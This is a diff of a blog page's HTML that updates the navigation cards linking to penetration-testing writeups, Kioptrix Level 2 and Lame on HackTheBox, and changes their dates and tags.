+                            My Notes - Kioptrix Level 2 Writeup
                         
                     </div>
                     <div class="publish-info">
                             <span class="publish-date">
-                                <i class="far fa-clock fa-fw icon-date"></i>2019-01-18
+                                <i class="far fa-clock fa-fw icon-date"></i>2021-06-20
                             </span>
                         <span class="publish-author">
                             
@@ -784,8 +946,80 @@ https://www.owasp.org/index.php/XSS_Filter_Evasion_Cheat_Sheet</code></pre>
                 
                 <div class="card-action article-tags">
                     
-                    <a href="/tags/Bwapp/">
-                        <span class="chip bg-color">Bwapp</span>
+                    <a href="/tags/OSCP/">
+                        <span class="chip bg-color">OSCP</span>
+                    </a>
+                    
+                    <a href="/tags/Notes/">
+                        <span class="chip bg-color">Notes</span>
+                    </a>
+                    
+                    <a href="/tags/VulnHub/">
+                        <span class="chip bg-color">VulnHub</span>
+                    </a>
+                    
+                    <a href="/tags/Writeups/">
+                        <span class="chip bg-color">Writeups</span>
+                    </a>
+                    
+                </div>
+                
+            </div>
+        </div>
+        
+        
+        <div class="article col s12 m6" data-aos="fade-up">
+            <div class="article-badge right-badge text-color">
+                Next&nbsp;<i class="fas fa-chevron-right"></i>
+            </div>
+            <div class="card">
+                <a href="/Writeups/Lame-HTB-writeup/">
+                    <div class="card-image">
+                        
+                        <img src="/medias/writeups/HTB/Lame/Lame.png" class="responsive-img" alt="Lame HTB Writeup">
+                        
+                        <span class="card-title">Lame HTB Writeup</span>
+                    </div>
+                </a>
+                <div class="card-content article-content">
+                    <div class="summary block-with-text">
+                        
+                            My Notes - Lame HackTheBox Writeup
+                        
+                    </div>
+                    <div class="publish-info">
+                            <span class="publish-date">
+                                <i class="far fa-clock fa-fw icon-date"></i>2021-06-14
+                            </span>
+                        <span class="publish-author">
+                            
+                            <i class="fas fa-bookmark fa-fw icon-category"></i>
+                            
+                            <a href="/categories/Writeups/" class="post-category">
+                                    Writeups
+                                </a>
+                            
+                            
+                        </span>
+                    </div>
+                </div>
+                
+                <div class="card-action article-tags">
+                    
+                    <a href="/tags/OSCP/">
+                        <span class="chip bg-color">OSCP</span>
+                    </a>
+                    
+                    <a href="/tags/Notes/">
+                        <span class="chip bg-color">Notes</span>
+                    </a>
+                    
+                    <a href="/tags/Writeups/">
+                        <span class="chip bg-color">Writeups</span>
+                    </a>
+                    
+                    <a href="/tags/HTB/">
+                        <span class="chip bg-color">HTB</span>
                     </a>
                     
                 </div>
